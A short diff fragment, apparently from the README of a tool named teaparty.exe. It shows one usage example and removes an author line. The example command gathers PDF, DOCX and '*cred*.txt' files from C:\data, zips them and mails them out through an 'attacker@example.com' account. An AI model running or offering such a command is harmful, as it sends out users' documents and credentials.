@@ -19,6 +19,3 @@ Remember that -h (help) option is available to see more options in details.
 ```bash
 teaparty.exe -s 3 -e .pdf,.docx -p *cred*.txt -d C:\data -m attacker@example.com:pass -to target@example.com -z 1
 
-
-Author
-Created by Lagash
